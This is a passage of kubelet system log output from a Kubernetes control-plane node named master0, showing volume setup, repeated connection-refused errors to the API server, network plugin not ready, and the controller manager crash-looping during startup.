\"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"usr-local-share-ca-certificates\\\" (UniqueName: \\\"kubernetes.io/host-path/7b1a28f140e1f4144f7bd4fae347b484-usr-local-share-ca-certificates\\\") pod \\\"kube-apiserver-master0\\\" (UID: \\\"7b1a28f140e1f4144f7bd4fae347b484\\\") \" pod=\"kube-system/kube-apiserver-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.283802     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"k8s-certs\\\" (UniqueName: \\\"kubernetes.io/host-path/07dc1079c410123fdbdd120d096c4f3e-k8s-certs\\\") pod \\\"kube-controller-manager-master0\\\" (UID: \\\"07dc1079c410123fdbdd120d096c4f3e\\\") \" pod=\"kube-system/kube-controller-manager-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.283981     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"kubeconfig\\\" (UniqueName: \\\"kubernetes.io/host-path/fa768acb94c6cd1f77a2619331162053-kubeconfig\\\") pod \\\"kube-scheduler-master0\\\" (UID: \\\"fa768acb94c6cd1f77a2619331162053\\\") \" pod=\"kube-system/kube-scheduler-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.284037     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"flexvolume-dir\\\" (UniqueName: \\\"kubernetes.io/host-path/07dc1079c410123fdbdd120d096c4f3e-flexvolume-dir\\\") pod \\\"kube-controller-manager-master0\\\" (UID: \\\"07dc1079c410123fdbdd120d096c4f3e\\\") \" pod=\"kube-system/kube-controller-manager-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.284202     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"etcd-data\\\" (UniqueName: \\\"kubernetes.io/host-path/3da0b3b3f5b168e56c71dd2c6212a28e-etcd-data\\\") pod \\\"etcd-master0\\\" (UID: \\\"3da0b3b3f5b168e56c71dd2c6212a28e\\\") \" pod=\"kube-system/etcd-master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.380742     518 controller.go:144] failed to ensure lease exists, will retry in 800ms, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.382733     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.483379     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:46 master0 kubelet[518]: I0524 18:19:46.485356     518 kubelet_node_status.go:70] \"Attempting to register node\" node=\"master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.485793     518 kubelet_node_status.go:92] \"Unable to register node with API server\" err=\"Post \\\"https://10.88.3.60:6443/api/v1/nodes\\\": dial tcp 10.88.3.60:6443: connect: connection refused\" node=\"master0\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.584143     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.684873     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.785677     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:46 master0 kubelet[518]: W0524 18:19:46.846517     518 reflector.go:324] vendor/k8s.io/client-go/informers/factory.go:134: failed to list *v1.Node: Get \"https://10.88.3.60:6443/api/v1/nodes?fieldSelector=metadata.name%3Dmaster0&limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.846584     518 reflector.go:138] vendor/k8s.io/client-go/informers/factory.go:134: Failed to watch *v1.Node: failed to list *v1.Node: Get \"https://10.88.3.60:6443/api/v1/nodes?fieldSelector=metadata.name%3Dmaster0&limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.886003     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:46 master0 kubelet[518]: E0524 18:19:46.986112     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.086585     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:47 master0 kubelet[518]: W0524 18:19:47.132629     518 reflector.go:324] vendor/k8s.io/client-go/informers/factory.go:134: failed to list *v1.CSIDriver: Get \"https://10.88.3.60:6443/apis/storage.k8s.io/v1/csidrivers?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.132768     518 reflector.go:138] vendor/k8s.io/client-go/informers/factory.go:134: Failed to watch *v1.CSIDriver: failed to list *v1.CSIDriver: Get \"https://10.88.3.60:6443/apis/storage.k8s.io/v1/csidrivers?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.181456     518 controller.go:144] failed to ensure lease exists, will retry in 1.6s, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.187554     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.288236     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:47 master0 kubelet[518]: I0524 18:19:47.289140     518 kubelet_node_status.go:70] \"Attempting to register node\" node=\"master0\"\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.289925     518 kubelet_node_status.go:92] \"Unable to register node with API server\" err=\"Post \\\"https://10.88.3.60:6443/api/v1/nodes\\\": dial tcp 10.88.3.60:6443: connect: connection refused\" node=\"master0\"\r\nMay 24 18:19:47 master0 kubelet[518]: W0524 18:19:47.309588     518 reflector.go:324] vendor/k8s.io/client-go/informers/factory.go:134: failed to list *v1.Service: Get \"https://10.88.3.60:6443/api/v1/services?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.309656     518 reflector.go:138] vendor/k8s.io/client-go/informers/factory.go:134: Failed to watch *v1.Service: failed to list *v1.Service: Get \"https://10.88.3.60:6443/api/v1/services?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:47 master0 kubelet[518]: W0524 18:19:47.375910     518 reflector.go:324] vendor/k8s.io/client-go/informers/factory.go:134: failed to list *v1.RuntimeClass: Get \"https://10.88.3.60:6443/apis/node.k8s.io/v1/runtimeclasses?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.376016     518 reflector.go:138] vendor/k8s.io/client-go/informers/factory.go:134: Failed to watch *v1.RuntimeClass: failed to list *v1.RuntimeClass: Get \"https://10.88.3.60:6443/apis/node.k8s.io/v1/runtimeclasses?limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.388524     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.489581     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.590040     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.690475     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.790763     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.891512     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:47 master0 kubelet[518]: E0524 18:19:47.992058     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:48 master0 kubelet[518]: E0524 18:19:48.092128     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:48 master0 kubelet[518]: E0524 18:19:48.192577     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:48 master0 kubelet[518]: E0524 18:19:48.293485     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:48 master0 kubelet[518]: E0524 18:19:48.394008     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:48 master0 kubelet[518]: E0524 18:19:48.494931     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:48 master0 kubelet[518]: E0524 18:19:48.595720     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:48 master0 kubelet[518]: E0524 18:19:48.696317     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:48 master0 kubelet[518]: E0524 18:19:48.797343     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:48 master0 kubelet[518]: I0524 18:19:48.891199     518 kubelet_node_status.go:70] \"Attempting to register node\" node=\"master0\"\r\nMay 24 18:19:48 master0 kubelet[518]: E0524 18:19:48.897739     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:48 master0 kubelet[518]: E0524 18:19:48.998530     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:49 master0 kubelet[518]: E0524 18:19:49.098940     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:49 master0 kubelet[518]: E0524 18:19:49.199369     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:49 master0 kubelet[518]: E0524 18:19:49.300471     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:49 master0 kubelet[518]: E0524 18:19:49.400543     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:49 master0 kubelet[518]: E0524 18:19:49.501110     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:49 master0 kubelet[518]: E0524 18:19:49.601767     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:49 master0 kubelet[518]: E0524 18:19:49.702216     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:49 master0 kubelet[518]: E0524 18:19:49.803257     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:49 master0 kubelet[518]: E0524 18:19:49.903944     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:50 master0 kubelet[518]: E0524 18:19:50.004555     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:50 master0 kubelet[518]: E0524 18:19:50.105001     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:50 master0 kubelet[518]: E0524 18:19:50.205489     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:50 master0 kubelet[518]: E0524 18:19:50.306277     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:50 master0 kubelet[518]: E0524 18:19:50.406917     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:50 master0 kubelet[518]: E0524 18:19:50.507528     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:50 master0 kubelet[518]: E0524 18:19:50.607706     518 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.708103     518 kuberuntime_manager.go:1095] \"Updating runtime config through cri with podcidr\" CIDR=\"10.88.0.0/24\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.709271     518 kubelet_network.go:60] \"Updating Pod CIDR\" originalPodCIDR=\"\" newPodCIDR=\"10.88.0.0/24\"\r\nMay 24 18:19:50 master0 kubelet[518]: E0524 18:19:50.709814     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.718221     518 kubelet_node_status.go:108] \"Node was previously registered\" node=\"master0\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.718297     518 kubelet_node_status.go:73] \"Successfully registered node\" node=\"master0\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.765836     518 apiserver.go:52] \"Watching apiserver\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.769323     518 topology_manager.go:200] \"Topology Admit Handler\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.808894     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"kube-proxy\\\" (UniqueName: \\\"kubernetes.io/configmap/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-proxy\\\") pod \\\"kube-proxy-qzlw9\\\" (UID: \\\"f4e454d0-9316-4b44-92e9-498d8668a6fb\\\") \" pod=\"kube-system/kube-proxy-qzlw9\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.808940     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"kube-api-access-tncz8\\\" (UniqueName: \\\"kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8\\\") pod \\\"kube-proxy-qzlw9\\\" (UID: \\\"f4e454d0-9316-4b44-92e9-498d8668a6fb\\\") \" pod=\"kube-system/kube-proxy-qzlw9\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.809112     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"xtables-lock\\\" (UniqueName: \\\"kubernetes.io/host-path/f4e454d0-9316-4b44-92e9-498d8668a6fb-xtables-lock\\\") pod \\\"kube-proxy-qzlw9\\\" (UID: \\\"f4e454d0-9316-4b44-92e9-498d8668a6fb\\\") \" pod=\"kube-system/kube-proxy-qzlw9\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.809147     518 reconciler.go:270] \"operationExecutor.VerifyControllerAttachedVolume started for volume \\\"lib-modules\\\" (UniqueName: \\\"kubernetes.io/host-path/f4e454d0-9316-4b44-92e9-498d8668a6fb-lib-modules\\\") pod \\\"kube-proxy-qzlw9\\\" (UID: \\\"f4e454d0-9316-4b44-92e9-498d8668a6fb\\\") \" pod=\"kube-system/kube-proxy-qzlw9\"\r\nMay 24 18:19:50 master0 kubelet[518]: I0524 18:19:50.809220     518 reconciler.go:157] \"Reconciler: start to sync state\"\r\nMay 24 18:19:50 master0 kubelet[518]: E0524 18:19:50.916407     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:19:51 master0 kubelet[518]: E0524 18:19:51.163832     518 projected.go:192] Error preparing data for projected volume kube-api-access-tncz8 for pod kube-system/kube-proxy-qzlw9: failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:51 master0 kubelet[518]: E0524 18:19:51.164023     518 nestedpendingoperations.go:335] Operation for \"{volumeName:kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8 podName:f4e454d0-9316-4b44-92e9-498d8668a6fb nodeName:}\" failed. No retries permitted until 2022-05-24 18:19:51.663945996 +0000 UTC m=+6.183344588 (durationBeforeRetry 500ms). Error: MountVolume.SetUp failed for volume \"kube-api-access-tncz8\" (UniqueName: \"kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8\") pod \"kube-proxy-qzlw9\" (UID: \"f4e454d0-9316-4b44-92e9-498d8668a6fb\") : failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:51 master0 kubelet[518]: I0524 18:19:51.362581     518 status_manager.go:664] \"Failed to get status for pod\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e pod=\"kube-system/etcd-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/etcd-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:51 master0 kubelet[518]: I0524 18:19:51.563091     518 status_manager.go:664] \"Failed to get status for pod\" podUID=f4e454d0-9316-4b44-92e9-498d8668a6fb pod=\"kube-system/kube-proxy-qzlw9\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-proxy-qzlw9\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:51 master0 kubelet[518]: I0524 18:19:51.762947     518 status_manager.go:664] \"Failed to get status for pod\" podUID=fa768acb94c6cd1f77a2619331162053 pod=\"kube-system/kube-scheduler-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-scheduler-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:51 master0 kubelet[518]: E0524 18:19:51.963286     518 projected.go:192] Error preparing data for projected volume kube-api-access-tncz8 for pod kube-system/kube-proxy-qzlw9: failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:51 master0 kubelet[518]: E0524 18:19:51.963416     518 nestedpendingoperations.go:335] Operation for \"{volumeName:kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8 podName:f4e454d0-9316-4b44-92e9-498d8668a6fb nodeName:}\" failed. No retries permitted until 2022-05-24 18:19:52.963383045 +0000 UTC m=+7.482781627 (durationBeforeRetry 1s). Error: MountVolume.SetUp failed for volume \"kube-api-access-tncz8\" (UniqueName: \"kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8\") pod \"kube-proxy-qzlw9\" (UID: \"f4e454d0-9316-4b44-92e9-498d8668a6fb\") : failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:52 master0 kubelet[518]: I0524 18:19:52.162933     518 status_manager.go:664] \"Failed to get status for pod\" podUID=7b1a28f140e1f4144f7bd4fae347b484 pod=\"kube-system/kube-apiserver-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-apiserver-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:52 master0 kubelet[518]: E0524 18:19:52.828164     518 event.go:276] Unable to write event: '&v1.Event{TypeMeta:v1.TypeMeta{Kind:\"\", APIVersion:\"\"}, ObjectMeta:v1.ObjectMeta{Name:\"master0.16f21d7153d06a40\", GenerateName:\"\", Namespace:\"default\", SelfLink:\"\", UID:\"\", ResourceVersion:\"\", Generation:0, CreationTimestamp:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), DeletionTimestamp:<nil>, DeletionGracePeriodSeconds:(*int64)(nil), Labels:map[string]string(nil), Annotations:map[string]string(nil), OwnerReferences:[]v1.OwnerReference(nil), Finalizers:[]string(nil), ZZZ_DeprecatedClusterName:\"\", ManagedFields:[]v1.ManagedFieldsEntry(nil)}, InvolvedObject:v1.ObjectReference{Kind:\"Node\", Namespace:\"\", Name:\"master0\", UID:\"master0\", APIVersion:\"\", ResourceVersion:\"\", FieldPath:\"\"}, Reason:\"Starting\", Message:\"Starting kubelet.\", Source:v1.EventSource{Component:\"kubelet\", Host:\"master0\"}, FirstTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), LastTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), Count:1, Type:\"Normal\", EventTime:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), Series:(*v1.EventSeries)(nil), Action:\"\", Related:(*v1.ObjectReference)(nil), ReportingController:\"\", ReportingInstance:\"\"}': 'Post \"https://10.88.3.60:6443/api/v1/namespaces/default/events\": dial tcp 10.88.3.60:6443: connect: connection refused'(may retry after sleeping)\r\nMay 24 18:19:53 master0 kubelet[518]: E0524 18:19:53.026725     518 projected.go:192] Error preparing data for projected volume kube-api-access-tncz8 for pod kube-system/kube-proxy-qzlw9: failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:53 master0 kubelet[518]: E0524 18:19:53.026791     518 nestedpendingoperations.go:335] Operation for \"{volumeName:kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8 podName:f4e454d0-9316-4b44-92e9-498d8668a6fb nodeName:}\" failed. No retries permitted until 2022-05-24 18:19:55.026772871 +0000 UTC m=+9.546171453 (durationBeforeRetry 2s). Error: MountVolume.SetUp failed for volume \"kube-api-access-tncz8\" (UniqueName: \"kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8\") pod \"kube-proxy-qzlw9\" (UID: \"f4e454d0-9316-4b44-92e9-498d8668a6fb\") : failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:53 master0 kubelet[518]: I0524 18:19:53.099505     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"4f6c16dd740a75bb31e4309147708c7be8601054718f52f1111534a9888b4bae\"\r\nMay 24 18:19:53 master0 kubelet[518]: I0524 18:19:53.099560     518 scope.go:110] \"RemoveContainer\" containerID=\"a6341035f36b2480c86c469b6457050a36e64f395c5db9b9730443073541e1db\"\r\nMay 24 18:19:53 master0 kubelet[518]: I0524 18:19:53.100197     518 status_manager.go:664] \"Failed to get status for pod\" podUID=07dc1079c410123fdbdd120d096c4f3e pod=\"kube-system/kube-controller-manager-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-controller-manager-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:53 master0 kubelet[518]: E0524 18:19:53.191973     518 pod_workers.go:951] \"Error syncing pod, skipping\" err=\"failed to \\\"StartContainer\\\" for \\\"kube-controller-manager\\\" with CrashLoopBackOff: \\\"back-off 10s restarting failed container=kube-controller-manager pod=kube-controller-manager-master0_kube-system(07dc1079c410123fdbdd120d096c4f3e)\\\"\" pod=\"kube-system/kube-controller-manager-master0\" podUID=07dc1079c410123fdbdd120d096c4f3e\r\nMay 24 18:19:54 master0 kubelet[518]: I0524 18:19:54.102584     518 scope.go:110] \"RemoveContainer\" containerID=\"17244f7547b1952d013c6d9b6df964d09db000e185b935070d14c9add39d2896\"\r\nMay 24 18:19:54 master0 kubelet[518]: I0524 18:19:54.103196     518 status_manager.go:664] \"Failed to get status for pod\" podUID=07dc1079c410123fdbdd120d096c4f3e pod=\"kube-system/kube-controller-manager-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-controller-manager-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:54 master0 kubelet[518]: E0524 18:19:54.103775     518 pod_workers.go:951] \"Error syncing pod, skipping\" err=\"failed to \\\"StartContainer\\\" for \\\"kube-controller-manager\\\" with CrashLoopBackOff: \\\"back-off 10s restarting failed container=kube-controller-manager pod=kube-controller-manager-master0_kube-system(07dc1079c410123fdbdd120d096c4f3e)\\\"\" pod=\"kube-system/kube-controller-manager-master0\" podUID=07dc1079c410123fdbdd120d096c4f3e\r\nMay 24 18:19:55 master0 kubelet[518]: E0524 18:19:55.041267     518 projected.go:192] Error preparing data for projected volume kube-api-access-tncz8 for pod kube-system/kube-proxy-qzlw9: failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:55 master0 kubelet[518]: E0524 18:19:55.041428     518 nestedpendingoperations.go:335] Operation for \"{volumeName:kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8 podName:f4e454d0-9316-4b44-92e9-498d8668a6fb nodeName:}\" failed. No retries permitted until 2022-05-24 18:19:59.041337549 +0000 UTC m=+13.560736131 (durationBeforeRetry 4s). Error: MountVolume.SetUp failed for volume \"kube-api-access-tncz8\" (UniqueName: \"kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8\") pod \"kube-proxy-qzlw9\" (UID: \"f4e454d0-9316-4b44-92e9-498d8668a6fb\") : failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:55 master0 kubelet[518]: I0524 18:19:55.104234     518 scope.go:110] \"RemoveContainer\" containerID=\"17244f7547b1952d013c6d9b6df964d09db000e185b935070d14c9add39d2896\"\r\nMay 24 18:19:55 master0 kubelet[518]: E0524 18:19:55.104693     518 pod_workers.go:951] \"Error syncing pod, skipping\" err=\"failed to \\\"StartContainer\\\" for \\\"kube-controller-manager\\\" with CrashLoopBackOff: \\\"back-off 10s restarting failed container=kube-controller-manager pod=kube-controller-manager-master0_kube-system(07dc1079c410123fdbdd120d096c4f3e)\\\"\" pod=\"kube-system/kube-controller-manager-master0\" podUID=07dc1079c410123fdbdd120d096c4f3e\r\nMay 24 18:19:55 master0 kubelet[518]: E0524 18:19:55.918927     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:19:56 master0 kubelet[518]: I0524 18:19:56.061912     518 status_manager.go:664] \"Failed to get status for pod\" podUID=07dc1079c410123fdbdd120d096c4f3e pod=\"kube-system/kube-controller-manager-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-controller-manager-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:56 master0 kubelet[518]: I0524 18:19:56.062241     518 status_manager.go:664] \"Failed to get status for pod\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e pod=\"kube-system/etcd-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/etcd-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:56 master0 kubelet[518]: I0524 18:19:56.062549     518 status_manager.go:664] \"Failed to get status for pod\" podUID=f4e454d0-9316-4b44-92e9-498d8668a6fb pod=\"kube-system/kube-proxy-qzlw9\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-proxy-qzlw9\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:56 master0 kubelet[518]: I0524 18:19:56.062880     518 status_manager.go:664] \"Failed to get status for pod\" podUID=fa768acb94c6cd1f77a2619331162053 pod=\"kube-system/kube-scheduler-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-scheduler-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:56 master0 kubelet[518]: I0524 18:19:56.063185     518 status_manager.go:664] \"Failed to get status for pod\" podUID=7b1a28f140e1f4144f7bd4fae347b484 pod=\"kube-system/kube-apiserver-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-apiserver-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:19:59 master0 